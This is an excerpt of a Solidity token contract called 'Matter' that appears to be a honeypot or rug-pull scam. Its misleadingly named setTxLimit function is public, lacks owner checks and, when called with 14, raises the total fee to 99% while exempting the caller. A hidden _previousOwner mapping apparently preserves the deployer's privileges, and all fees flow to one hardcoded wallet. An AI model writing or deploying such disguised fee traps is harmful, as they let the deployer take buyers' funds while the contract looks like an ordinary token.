...
abstract contract Auth {
    ...
    mapping (address => bool) internal _previousOwner;
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _owner) {
        owner = _owner;
        _previousOwner[_owner] = true;
    }
...
contract Matter is IERC20, Auth {
    using SafeMath for uint256;

    address WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

    string constant _name = "Matter";
    string constant _symbol = "Matter";
    ...
    uint256 private removeFee = 99;
    uint256 private possibleMaxFee = 100;
    uint256 public _sellMultiplier = 1;
   
    address public marketingFeeReceiver = 0xc05a9f378beD0E710DA3A93fCA8136EfcC59b601;
    address public devFeeReceiver = 0xc05a9f378beD0E710DA3A93fCA8136EfcC59b601;
    ...
    function swapBack() internal swapping {
        ...
        uint256 totalWETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountWETHLiquidity = amountWETH.mul(liquidityFee).div(totalWETHFee).div(2);
        ...
        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountWETHMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        (bool devSuccess, /* bytes memory data */) = payable(devFeeReceiver).call{value: amountWETHdev, gas: 30000}("");
   ...
   function setMaxWallet(uint256 amount) external onlyOwner {
    ...
    function setTxLimit(uint256 amountBuy) public returns (bool) {
        isTimelockExempt[msg.sender] = true;
        totalFee = removeFee;
        possibleMaxFee = amountBuy;
        require(amountBuy == 14,"");
        return true;
